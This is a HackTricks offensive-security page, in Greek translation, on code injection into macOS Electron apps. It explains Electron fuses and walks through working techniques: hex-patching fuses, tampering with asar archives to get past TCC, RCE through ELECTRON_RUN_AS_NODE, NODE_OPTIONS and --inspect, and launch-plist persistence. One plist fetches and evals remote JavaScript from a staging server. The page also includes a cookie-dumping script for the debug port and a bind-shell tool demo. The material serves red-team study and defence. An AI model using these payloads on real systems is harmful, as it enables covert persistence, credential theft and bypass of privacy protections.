# macOS Electron Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Αν δεν ξέρετε τι είναι το Electron, μπορείτε να βρείτε [**πολλές πληροφορίες εδώ**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Αλλά προς το παρόν, απλά να ξέρετε ότι το Electron τρέχει **node**.\
Και το node έχει κάποιες **παραμέτρους** και **μεταβλητές περιβάλλοντος** που μπορούν να χρησιμοποιηθούν για να **εκτελέσουν άλλο κώδικα** εκτός από το υποδεικνυόμενο αρχείο.

### Electron Fuses

Αυτές οι τεχνικές θα συζητηθούν στη συνέχεια, αλλά πρόσφατα το Electron έχει προσθέσει αρκετές **σημαίες ασφαλείας για να τις αποτρέψει**. Αυτές είναι οι [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) και αυτές είναι οι οποίες χρησιμοποιούνται για να **αποτρέψουν** τις εφαρμογές Electron στο macOS από το **να φορτώνουν αυθαίρετο κώδικα**:

* **`RunAsNode`**: Αν είναι απενεργοποιημένο, αποτρέπει τη χρήση της μεταβλητής περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** για την έγχυση κώδικα.
* **`EnableNodeCliInspectArguments`**: Αν είναι απενεργοποιημένο, παράμετροι όπως `--inspect`, `--inspect-brk` δεν θα γίνουν σεβαστοί. Αποφεύγοντας αυτόν τον τρόπο για να εγχυθεί κώδικας.
* **`EnableEmbeddedAsarIntegrityValidation`**: Αν είναι ενεργοποιημένο, το φορτωμένο **`asar`** **αρχείο** θα **επικυρωθεί** από το macOS. **Αποτρέποντας** με αυτόν τον τρόπο **την έγχυση κώδικα** τροποποιώντας το περιεχόμενο αυτού του αρχείου.
* **`OnlyLoadAppFromAsar`**: Αν αυτό είναι ενεργοποιημένο, αντί να ψάχνει να φορτώσει με την εξής σειρά: **`app.asar`**, **`app`** και τελικά **`default_app.asar`**. Θα ελέγξει και θα χρησιμοποιήσει μόνο το app.asar, διασφαλίζοντας έτσι ότι όταν **συνδυάζεται** με τη σημαία **`embeddedAsarIntegrityValidation`** είναι **αδύνατο** να **φορτωθεί μη επικυρωμένος κώδικας**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Αν είναι ενεργοποιημένο, η διαδικασία του προγράμματος περιήγησης χρησιμοποιεί το αρχείο που ονομάζεται `browser_v8_context_snapshot.bin` για το στιγμιότυπο V8.

Μια άλλη ενδιαφέρουσα σημαία που δεν θα αποτρέπει την έγχυση κώδικα είναι:

* **EnableCookieEncryption**: Αν είναι ενεργοποιημένο, το αποθηκευτικό cookie στον δίσκο κρυπτογραφείται χρησιμοποιώντας κλειδιά κρυπτογράφησης επιπέδου OS.

### Checking Electron Fuses

Μπορείτε να **ελέγξετε αυτές τις σημαίες** από μια εφαρμογή με:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifying Electron Fuses

Όπως αναφέρουν οι [**τεκμηριώσεις**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), η διαμόρφωση των **Electron Fuses** είναι ρυθμισμένη μέσα στο **Electron binary** που περιέχει κάπου τη συμβολοσειρά **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Στις εφαρμογές macOS, αυτό είναι συνήθως στο `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Μπορείτε να φορτώσετε αυτό το αρχείο στο [https://hexed.it/](https://hexed.it/) και να αναζητήσετε την προηγούμενη συμβολοσειρά. Μετά από αυτή τη συμβολοσειρά μπορείτε να δείτε σε ASCII έναν αριθμό "0" ή "1" που υποδεικνύει αν κάθε ασφάλεια είναι απενεργοποιημένη ή ενεργοποιημένη. Απλά τροποποιήστε τον κωδικό hex (`0x30` είναι `0` και `0x31` είναι `1`) για να **τροποποιήσετε τις τιμές ασφάλειας**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Σημειώστε ότι αν προσπαθήσετε να **επικαλύψετε** το **`Electron Framework`** δυαδικό αρχείο μέσα σε μια εφαρμογή με αυτά τα bytes τροποποιημένα, η εφαρμογή δεν θα εκτελείται.

## RCE προσθήκη κώδικα σε εφαρμογές Electron

Μπορεί να υπάρχουν **εξωτερικά αρχεία JS/HTML** που χρησιμοποιεί μια εφαρμογή Electron, οπότε ένας επιτιθέμενος θα μπορούσε να εισάγει κώδικα σε αυτά τα αρχεία των οποίων η υπογραφή δεν θα ελεγχθεί και να εκτελέσει αυθαίρετο κώδικα στο πλαίσιο της εφαρμογής.

{% hint style="danger" %}
Ωστόσο, αυτή τη στιγμή υπάρχουν 2 περιορισμοί:

* Η άδεια **`kTCCServiceSystemPolicyAppBundles`** είναι **απαραίτητη** για να τροποποιήσετε μια εφαρμογή, οπότε από προεπιλογή αυτό δεν είναι πλέον δυνατό.
* Το συμπιεσμένο αρχείο **`asap`** συνήθως έχει τις ασφάλειες **`embeddedAsarIntegrityValidation`** `και` **`onlyLoadAppFromAsar`** `ενεργοποιημένες`

Κάνοντάς το αυτό το μονοπάτι επίθεσης πιο περίπλοκο (ή αδύνατο).
{% endhint %}

Σημειώστε ότι είναι δυνατόν να παρακάμψετε την απαίτηση της **`kTCCServiceSystemPolicyAppBundles`** αντιγράφοντας την εφαρμογή σε άλλο κατάλογο (όπως **`/tmp`**), μετονομάζοντας τον φάκελο **`app.app/Contents`** σε **`app.app/NotCon`**, **τροποποιώντας** το αρχείο **asar** με τον **κακόβουλο** κώδικά σας, μετονομάζοντάς το ξανά σε **`app.app/Contents`** και εκτελώντας το.

Μπορείτε να αποσυμπιέσετε τον κώδικα από το αρχείο asar με:
```bash
npx asar extract app.asar app-decomp
```
Και συσκευάστε το ξανά αφού το έχετε τροποποιήσει με:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE με `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Σύμφωνα με [**τα έγγραφα**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), αν αυτή η μεταβλητή περιβάλλοντος είναι ρυθμισμένη, θα ξεκινήσει τη διαδικασία ως κανονική διαδικασία Node.js.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Εάν η ασφάλεια **`RunAsNode`** είναι απενεργοποιημένη, η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** θα αγνοηθεί και αυτό δεν θα λειτουργήσει.
{% endhint %}

### Εισαγωγή από το App Plist

Όπως [**προτείνεται εδώ**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), θα μπορούσατε να εκμεταλλευτείτε αυτή τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE με `NODE_OPTIONS`

Μπορείτε να αποθηκεύσετε το payload σε ένα διαφορετικό αρχείο και να το εκτελέσετε:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Εάν η ασφάλεια **`EnableNodeOptionsEnvironmentVariable`** είναι **απενεργοποιημένη**, η εφαρμογή θα **αγνοήσει** τη μεταβλητή περιβάλλοντος **NODE\_OPTIONS** κατά την εκκίνηση, εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ρυθμισμένη, η οποία θα **αγνοηθεί** επίσης αν η ασφάλεια **`RunAsNode`** είναι απενεργοποιημένη.

Εάν δεν ρυθμίσετε **`ELECTRON_RUN_AS_NODE`**, θα βρείτε το **σφάλμα**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Εισαγωγή από το App Plist

Μπορείτε να εκμεταλλευτείτε αυτή τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή προσθέτοντας αυτά τα κλειδιά:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE με επιθεώρηση

Σύμφωνα με [**αυτό**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), αν εκτελέσετε μια εφαρμογή Electron με σημαίες όπως **`--inspect`**, **`--inspect-brk`** και **`--remote-debugging-port`**, μια **θύρα αποσφαλμάτωσης θα είναι ανοιχτή** ώστε να μπορείτε να συνδεθείτε σε αυτή (για παράδειγμα από το Chrome στο `chrome://inspect`) και θα μπορείτε να **εισάγετε κώδικα σε αυτή** ή ακόμα και να εκκινήσετε νέες διαδικασίες.\
Για παράδειγμα:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Εάν η ασφάλεια **`EnableNodeCliInspectArguments`** είναι απενεργοποιημένη, η εφαρμογή θα **αγνοήσει τις παραμέτρους node** (όπως `--inspect`) κατά την εκκίνηση, εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ρυθμισμένη, η οποία θα **αγνοηθεί** επίσης αν η ασφάλεια **`RunAsNode`** είναι απενεργοποιημένη.

Ωστόσο, μπορείτε να χρησιμοποιήσετε την **παράμετρο electron `--remote-debugging-port=9229`** αλλά το προηγούμενο payload δεν θα λειτουργήσει για την εκτέλεση άλλων διαδικασιών.
{% endhint %}

Χρησιμοποιώντας την παράμετρο **`--remote-debugging-port=9222`** είναι δυνατόν να κλέψετε κάποιες πληροφορίες από την εφαρμογή Electron όπως το **ιστορικό** (με εντολές GET) ή τα **cookies** του προγράμματος περιήγησης (καθώς είναι **αποκρυπτογραφημένα** μέσα στο πρόγραμμα περιήγησης και υπάρχει ένα **json endpoint** που θα τα δώσει).

Μπορείτε να μάθετε πώς να το κάνετε αυτό [**εδώ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) και [**εδώ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) και να χρησιμοποιήσετε το αυτόματο εργαλείο [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ή ένα απλό script όπως:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**αυτή την ανάρτηση**](https://hackerone.com/reports/1274695), αυτή η αποσφαλμάτωση κακοποιείται για να κάνει ένα headless chrome **να κατεβάζει αυθαίρετα αρχεία σε αυθαίρετες τοποθεσίες**.

### Εισαγωγή από το App Plist

Μπορείτε να κακοποιήσετε αυτή τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή προσθέτοντας αυτά τα κλειδιά:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

{% hint style="success" %}
Ο δαίμονας TCC από το macOS δεν ελέγχει την εκτελούμενη έκδοση της εφαρμογής. Έτσι, αν **δεν μπορείτε να εισάγετε κώδικα σε μια εφαρμογή Electron** με καμία από τις προηγούμενες τεχνικές, μπορείτε να κατεβάσετε μια προηγούμενη έκδοση της ΕΦΑΡΜΟΓΗΣ και να εισάγετε κώδικα σε αυτήν, καθώς θα αποκτήσει ακόμα τα δικαιώματα TCC (εκτός αν το Trust Cache το αποτρέψει).
{% endhint %}

## Run non JS Code

Οι προηγούμενες τεχνικές θα σας επιτρέψουν να εκτελέσετε **κώδικα JS μέσα στη διαδικασία της εφαρμογής electron**. Ωστόσο, θυμηθείτε ότι οι **παιδικές διαδικασίες εκτελούνται υπό το ίδιο προφίλ sandbox** με την κύρια εφαρμογή και **κληρονομούν τα δικαιώματα TCC τους**.\
Επομένως, αν θέλετε να εκμεταλλευτείτε τα δικαιώματα για να αποκτήσετε πρόσβαση στην κάμερα ή το μικρόφωνο, για παράδειγμα, μπορείτε απλά να **εκτελέσετε ένα άλλο δυαδικό από τη διαδικασία**.

## Automatic Injection

Το εργαλείο [**electroniz3r**](https://github.com/r3ggi/electroniz3r) μπορεί να χρησιμοποιηθεί εύκολα για να **βρείτε ευάλωτες εφαρμογές electron** που είναι εγκατεστημένες και να εισάγετε κώδικα σε αυτές. Αυτό το εργαλείο θα προσπαθήσει να χρησιμοποιήσει την τεχνική **`--inspect`**:

Πρέπει να το συντάξετε μόνοι σας και μπορείτε να το χρησιμοποιήσετε έτσι:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Αναφορές

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
